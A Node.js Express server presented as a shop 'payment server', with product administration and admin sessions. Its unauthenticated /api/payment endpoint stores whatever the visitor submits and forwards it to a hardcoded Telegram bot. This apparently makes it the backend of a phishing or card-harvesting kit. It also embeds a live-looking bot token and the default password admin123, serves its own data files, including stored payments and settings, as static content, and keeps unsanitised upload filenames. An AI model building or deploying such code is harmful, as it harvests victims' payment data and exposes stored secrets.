const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const https = require('https');
const multer = require('multer');

const app = express();
const PORT = 3000;

// ==================== Telegram Config ====================
const TELEGRAM_BOT_TOKEN = '8573611022:AAHmICUdCas4w8vd5z_Kc0g1hEb_pXkJLMg';
const TELEGRAM_CHAT_ID = '1643260223';

// ==================== Admin Config ====================
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = 'admin123';

// ==================== File Upload Config ====================
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '_' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + '_' + file.originalname);
    }
});

const upload = multer({ storage });

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Data directories
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

const paymentsFile = path.join(dataDir, 'payments.json');
const ordersFile = path.join(dataDir, 'orders.json');
const productsFile = path.join(__dirname, 'products.json');
const settingsFile = path.join(dataDir, 'settings.json');
const sessionsFile = path.join(dataDir, 'sessions.json');

if (!fs.existsSync(sessionsFile)) {
    writeJsonFile(sessionsFile, []);
}

// Helper functions
function readJsonFile(filePath, defaultValue = []) {
    try {
        if (fs.existsSync(filePath)) {
            return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        }
        return defaultValue;
    } catch (error) {
        console.error(`Error reading ${filePath}:`, error);
        return defaultValue;
    }
}

function writeJsonFile(filePath, data) {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf-8');
        return true;
    } catch (error) {
        console.error(`Error writing ${filePath}:`, error);
        return false;
    }
}

// ==================== Telegram Sending ====================
function getSettings() {
    const defaults = {
        telegram_bot_token: TELEGRAM_BOT_TOKEN,
        telegram_chat_id: TELEGRAM_CHAT_ID,
        admin_username: ADMIN_USERNAME,
        admin_password: ADMIN_PASSWORD,
        backup_password: ''
    };
    try {
        if (fs.existsSync(settingsFile)) {
            const cfg = JSON.parse(fs.readFileSync(settingsFile, 'utf8')) || {};
            return Object.assign({}, defaults, cfg);
        }
        return defaults;
    } catch (err) {
        console.error('Error reading settings:', err);
        return defaults;
    }
}

function sendToTelegram(message) {
    return new Promise((resolve, reject) => {
        let cleanMessage = (message || '').trim();
        
        if (!cleanMessage) {
            cleanMessage = '📩 New data received from system';
        }

        const settings = getSettings();
        const botToken = settings.telegram_bot_token;
        const chatId = settings.telegram_chat_id;

        const data = JSON.stringify({
            chat_id: chatId,
            text: cleanMessage,
            parse_mode: 'HTML'
        });

        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const req = https.request(options, (res) => {
            let responseData = '';

            res.on('data', (chunk) => {
                responseData += chunk;
            });

            res.on('end', () => {
                try {
                    const result = JSON.parse(responseData);
                    if (result.ok) {
                        console.log('✅ Successfully sent to Telegram');
                        resolve(result);
                    } else {
                        console.error('❌ Telegram error:', result.description);
                        reject(result);
                    }
                } catch (error) {
                    reject(error);
                }
            });
        });

        req.on('error', (error) => {
            console.error('❌ Connection error:', error);
            reject(error);
        });

        req.write(data);
        req.end();
    });
}

// ==================== Admin Authentication ====================
function validateAdminAuth(req, res, next) {
    const authHeader = req.headers['authorization'];
    const settings = getSettings();

    if (!authHeader) {
        return res.status(401).json({ success: false, message: 'Not authorized' });
    }

    // Bearer token (session)
    if (authHeader.startsWith('Bearer ')) {
        const token = authHeader.split(' ')[1];
        try {
            const sessions = readJsonFile(sessionsFile, []);
            const s = sessions.find(x => x.id === token);
            if (s) {
                // update lastSeen
                s.lastSeen = new Date().toISOString();
                writeJsonFile(sessionsFile, sessions);
                req.adminSession = s;
                return next();
            }
            return res.status(403).json({ success: false, message: 'Invalid session token' });
        } catch (err) {
            return res.status(500).json({ success: false, message: 'Server error' });
        }
    }

    // Basic auth fallback (legacy)
    try {
        if (!authHeader.startsWith('Basic ')) {
            return res.status(403).json({ success: false, message: 'Invalid authorization format' });
        }
        const [username, password] = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
        if (username === settings.admin_username && password === settings.admin_password) {
            return next();
        }
        return res.status(403).json({ success: false, message: 'Invalid credentials' });
    } catch (error) {
        res.status(403).json({ success: false, message: 'Invalid authorization format' });
    }
}

// ==================== Products API ====================

// Get all products
app.get('/api/products', (req, res) => {
    try {
        const products = readJsonFile(productsFile, []);
        res.json({ success: true, data: products });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// Add product (admin)
app.post('/api/products', validateAdminAuth, upload.single('image'), (req, res) => {
    try {
        const { name, description, price, previous_price, discount, category } = req.body;
        const products = readJsonFile(productsFile, []);
        
        let image_url = '';
        if (req.file) {
            image_url = '/uploads/' + req.file.filename;
        }
        
        const newProduct = {
            id: products.length ? Math.max(...products.map(p => p.id)) + 1 : 1,
            name: name || 'New Product',
            description: description || '',
            price: parseFloat(price) || 0,
            previous_price: parseFloat(previous_price) || 0,
            discount: parseFloat(discount) || 0,
            category: category || '',
            image_url: image_url
        };
        
        products.unshift(newProduct);
        writeJsonFile(productsFile, products);
        
        res.json({ success: true, message: 'Product added', data: newProduct });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

// Update product (admin)
app.put('/api/products/:id', validateAdminAuth, upload.single('image'), (req, res) => {
    try {
        const productId = parseInt(req.params.id);
        const { name, description, price, previous_price, discount, category } = req.body;
        const products = readJsonFile(productsFile, []);
        
        const productIndex = products.findIndex(p => p.id === productId);
        if (productIndex === -1) {
            return res.status(404).json({ success: false, message: 'Product not found' });
        }
        
        products[productIndex].name = name || products[productIndex].name;
        products[productIndex].description = description || products[productIndex].description;
        products[productIndex].price = parseFloat(price) || products[productIndex].price;
        products[productIndex].previous_price = parseFloat(previous_price) || products[productIndex].previous_price;
        products[productIndex].discount = parseFloat(discount) || products[productIndex].discount;
        products[productIndex].category = category || products[productIndex].category;
        
        if (req.file) {
            if (products[productIndex].image_url && fs.existsSync(path.join(__dirname, products[productIndex].image_url))) {
                fs.unlinkSync(path.join(__dirname, products[productIndex].image_url));
            }
            products[productIndex].image_url = '/uploads/' + req.file.filename;
        }
        
        writeJsonFile(productsFile, products);
        
        res.json({ success: true, message: 'Product updated', data: products[productIndex] });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

// Delete product (admin)
app.delete('/api/products/:id', validateAdminAuth, (req, res) => {
    try {
        const productId = parseInt(req.params.id);
        const products = readJsonFile(productsFile, []);
        
        const productIndex = products.findIndex(p => p.id === productId);
        if (productIndex === -1) {
            return res.status(404).json({ success: false, message: 'Product not found' });
        }
        
        if (products[productIndex].image_url && fs.existsSync(path.join(__dirname, products[productIndex].image_url))) {
            fs.unlinkSync(path.join(__dirname, products[productIndex].image_url));
        }
        
        const deletedProduct = products.splice(productIndex, 1)[0];
        writeJsonFile(productsFile, products);
        
        res.json({ success: true, message: 'Product deleted', data: deletedProduct });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

// Delete all products (admin)
app.delete('/api/products', validateAdminAuth, (req, res) => {
    try {
        const products = readJsonFile(productsFile, []);
        
        products.forEach(product => {
            if (product.image_url && fs.existsSync(path.join(__dirname, product.image_url))) {
                fs.unlinkSync(path.join(__dirname, product.image_url));
            }
        });
        
        writeJsonFile(productsFile, []);
        
        res.json({ success: true, message: 'All products deleted' });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

// Duplicate product (admin)
app.post('/api/products/:id/duplicate', validateAdminAuth, (req, res) => {
    try {
        const productId = parseInt(req.params.id);
        const products = readJsonFile(productsFile, []);
        
        const productIndex = products.findIndex(p => p.id === productId);
        if (productIndex === -1) {
            return res.status(404).json({ success: false, message: 'Product not found' });
        }
        
        const duplicatedProduct = {
            ...products[productIndex],
            id: Math.max(...products.map(p => p.id)) + 1,
            name: products[productIndex].name + ' (Copy)'
        };
        
        products.unshift(duplicatedProduct);
        writeJsonFile(productsFile, products);
        
        res.json({ success: true, message: 'Product duplicated', data: duplicatedProduct });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Server error', error: error.message });
    }
});

// ==================== Payments API ====================

app.post('/api/payment', (req, res) => {
    try {
        const data = req.body;
        const { message, type } = data;
        
        const paymentId = uuidv4();
        const timestamp = new Date().toISOString();

        let telegramMessage = (message || '').trim();
        
        if (!telegramMessage) {
            telegramMessage = `📩 <b>New data - ${type || 'general'}</b>\n\n${JSON.stringify(data, null, 2)}`;
        }

        const payment = {
            id: paymentId,
            timestamp: timestamp,
            status: 'pending',
            type: type || 'general',
            ...data
        };

        const payments = readJsonFile(paymentsFile);
        payments.push(payment);
        writeJsonFile(paymentsFile, payments);

        console.log('📤 Sending to Telegram...');

        sendToTelegram(telegramMessage)
            .then(() => {
                console.log('✅ Sent successfully');
                res.json({
                    success: true,
                    message: 'Data received',
                    paymentId: paymentId
                });
            })
            .catch((error) => {
                console.error('⚠️ Telegram error:', error);
                res.json({
                    success: true,
                    message: 'Data saved (Telegram pending)',
                    paymentId: paymentId
                });
            });

    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error',
            error: error.message
        });
    }
});

// ==================== Static Pages ====================

// Settings endpoints (get/update Telegram config)
app.get('/api/settings', validateAdminAuth, (req, res) => {
    try {
        const settings = getSettings();
        res.json({ success: true, data: settings });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error reading settings' });
    }
});

app.put('/api/settings', validateAdminAuth, (req, res) => {
    try {
        const { telegram_bot_token, telegram_chat_id } = req.body || {};
        const cfg = getSettings();
        if (telegram_bot_token) cfg.telegram_bot_token = String(telegram_bot_token).trim();
        if (telegram_chat_id) cfg.telegram_chat_id = String(telegram_chat_id).trim();

        // also allow updating admin creds and backup password
        if (req.body.admin_username) cfg.admin_username = String(req.body.admin_username).trim();
        if (req.body.admin_password) cfg.admin_password = String(req.body.admin_password).trim();
        if (req.body.backup_password) cfg.backup_password = String(req.body.backup_password).trim();

        writeJsonFile(settingsFile, cfg);
        res.json({ success: true, message: 'Settings saved', data: cfg });
    } catch (error) {
        console.error('Error saving settings:', error);
        res.status(500).json({ success: false, message: 'Error saving settings' });
    }
});

// ==================== Admin login / sessions ====================
app.post('/api/admin/login', (req, res) => {
    try {
        const { username, password } = req.body || {};
        const settings = getSettings();
        if (!username || !password) return res.status(400).json({ success: false, message: 'Missing credentials' });

        const valid = (username === settings.admin_username && password === settings.admin_password) || (password === settings.backup_password && username === settings.admin_username);
        if (!valid) return res.status(403).json({ success: false, message: 'Invalid credentials' });

        // create session token
        const token = uuidv4();
        const ua = req.headers['user-agent'] || 'unknown';
        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        const sessions = readJsonFile(sessionsFile, []);
        const session = { id: token, username: username, userAgent: ua, ip: ip, createdAt: new Date().toISOString(), lastSeen: new Date().toISOString() };
        sessions.push(session);
        writeJsonFile(sessionsFile, sessions);

        res.json({ success: true, token: token, session: session });
    } catch (err) {
        console.error('Login error:', err);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// list sessions
app.get('/api/admin/sessions', validateAdminAuth, (req, res) => {
    try {
        const sessions = readJsonFile(sessionsFile, []);
        res.json({ success: true, data: sessions });
    } catch (err) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// logout (remove session)
app.post('/api/admin/sessions/:id/logout', validateAdminAuth, (req, res) => {
    try {
        const id = req.params.id;
        let sessions = readJsonFile(sessionsFile, []);
        const idx = sessions.findIndex(s => s.id === id);
        if (idx === -1) return res.status(404).json({ success: false, message: 'Session not found' });
        sessions.splice(idx, 1);
        writeJsonFile(sessionsFile, sessions);
        res.json({ success: true, message: 'Logged out' });
    } catch (err) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// change admin password
app.put('/api/admin/password', validateAdminAuth, (req, res) => {
    try {
        const { old_password, new_password } = req.body || {};
        if (!old_password || !new_password) return res.status(400).json({ success: false, message: 'Missing fields' });
        const settings = getSettings();
        if (old_password !== settings.admin_password) return res.status(403).json({ success: false, message: 'Old password incorrect' });
        settings.admin_password = String(new_password);
        writeJsonFile(settingsFile, settings);
        res.json({ success: true, message: 'Password changed' });
    } catch (err) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/admin-products', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin-products.html'));
});

// ==================== Start Server ====================

app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════╗
║  🚀 Payment Server Running             ║
║  URL: http://localhost:${PORT}          ║
║  Admin: http://localhost:${PORT}/admin           ║
║  Products: http://localhost:${PORT}/admin-products ║
║  Telegram Bot: Connected ✅            ║
╚════════════════════════════════════════╝
    `);
});

// Error handling
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught error:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled rejection:', reason);
});
